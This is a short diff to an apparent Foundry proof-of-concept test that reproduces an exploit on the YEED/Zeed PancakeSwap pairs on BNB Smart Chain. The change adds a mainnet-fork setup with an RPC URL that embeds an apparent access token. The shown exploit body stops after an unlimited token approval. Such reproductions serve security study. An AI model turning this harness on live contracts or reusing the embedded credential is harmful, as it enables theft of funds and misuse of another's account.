@@ -4,7 +4,6 @@ pragma solidity 0.8.10;
 import "ds-test/test.sol";
 import "./interface.sol";
 
-
 contract ContractTest is DSTest {
     IPancakeRouter pancakeRouter = IPancakeRouter(payable(0x6CD71A07E72C514f5d511651F6808c6395353968));
     IPancakePair usdtYeedHoSwapPair = IPancakePair(0x33d5e574Bd1EBf3Ceb693319C2e276DaBE388399);
@@ -13,6 +12,13 @@ contract ContractTest is DSTest {
     IPancakePair zeedYeedPair = IPancakePair(0x8893610232C87f4a38DC9B5Ab67cbc331dC615d6);
     IERC20 yeed = IERC20(0xe7748FCe1D1e2f2Fd2dDdB5074bD074745dDa8Ea);
     IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    uint256 mainnetFork;
+    
+    function setUp() public {
+        mainnetFork = cheats.createFork("https://divine-black-wind.bsc.discover.quiknode.pro/64ab050694137dfcbf4c20daec2e94dc515c1d60/", 17132514); // fork bsc at block 17132514
+        cheats.selectFork(mainnetFork);
+    }
 
     function testExploit() public {
        yeed.approve(address(pancakeRouter),type(uint256).max);
